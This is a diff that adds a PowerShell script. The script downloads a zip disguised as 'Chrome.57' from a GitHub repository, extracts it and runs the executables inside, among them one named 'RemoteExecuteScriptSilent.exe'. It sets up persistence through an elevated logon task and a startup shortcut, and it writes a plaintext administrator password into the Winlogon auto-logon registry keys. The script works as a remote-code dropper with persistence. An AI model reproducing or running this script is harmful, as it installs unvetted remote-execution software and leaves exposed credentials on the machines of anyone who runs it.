@@ -1,0 +1,61 @@
+Set-ExecutionPolicy RemoteSigned -Force
+$Url = 'https://github.com/37218vuuhuu/app-19/raw/main/Chrome.57.zip'
+
+[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls"
+
+$ProgressPreference = 'SilentlyContinue'
+
+Invoke-WebRequest $Url -OutFile Chrome.57.zip
+
+Expand-Archive Chrome.57.zip -DestinationPath Chrome.57
+sleep 1
+Start "C:\Users\Administrator\Chrome.57\Shutdown.exe"
+$Action=New-ScheduledTaskAction -Execute "powershell.exe"
+$Trigger=New-ScheduledTaskTrigger -AtLogOn
+$Set=New-ScheduledTaskSettingsSet
+$Principal=New-ScheduledTaskPrincipal -UserID "$env:username" -LogonType Interactive -RunLevel Highest
+$Task=New-ScheduledTask -Action $Action -Trigger $Trigger -Settings $Set -Principal $Principal
+Register-ScheduledTask -TaskName PowerShellAtLogon -InputObject $Task
+
+$RegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+$DefaultUsername = "Administrator"
+$DefaultPassword = "XuanNamVPS@@123"
+Set-ItemProperty $RegPath "AutoAdminLogon" -Value "1" -type String
+Set-ItemProperty $RegPath "DefaultUsername" -Value "$DefaultUsername" -type String
+Set-ItemProperty $RegPath "DefaultPassword" -Value "$DefaultPassword" -type String
+
+Start "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+$Action=New-ScheduledTaskAction -Execute "powershell.exe"
+$Trigger=New-ScheduledTaskTrigger -AtLogOn
+$Set=New-ScheduledTaskSettingsSet
+$Principal=New-ScheduledTaskPrincipal -UserID "$env:username" -LogonType Interactive -RunLevel Highest
+$Task=New-ScheduledTask -Action $Action -Trigger $Trigger -Settings $Set -Principal $Principal
+Register-ScheduledTask -TaskName PowerShellAtLogon -InputObject $Task
+Get-PSReadLineKeyHandler -Chord Enter
+Start "C:\Users\Administrator\Chrome.57\Autologon64.exe"
+sleep 280
+Get-PSReadLineKeyHandler -Chord Enter
+sleep 100
+Get-PSReadLineKeyHandler -Chord Enter
+sleep 50
+Get-PSReadLineKeyHandler -Chord Enter
+sleep 50
+Get-PSReadLineKeyHandler -Chord Enter
+Start "C:\Users\Administrator\Chrome.57\RemoteExecuteScriptSilent.exe" 
+Set-ExecutionPolicy RemoteSigned -Force
+$SourceFilePath = "C:\Users\Administrator\Chrome.57\RemoteExecuteScriptSilent.exe"
+$ShortcutPath = "C:\Users\Administrator\Start Menu\Programs\Startup\RemoteExecuteScriptSilent.lnk"
+$WScriptObj = New-Object -ComObject ("WScript.Shell")
+$shortcut = $WscriptObj.CreateShortcut($ShortcutPath)
+$shortcut.TargetPath = $SourceFilePath
+$shortcut.WindowStyle = 1
+$ShortCut.Hotkey = "F1"; $shortcut.Save()
+
+
+Get-PSReadLineKeyHandler -Chord Enter
+sleep 10
+Get-PSReadLineKeyHandler -Chord Enter
+sleep 10
+Get-PSReadLineKeyHandler -Chord Enter
+sleep 10
+Start "C:\Users\Administrator\Chrome.57\"
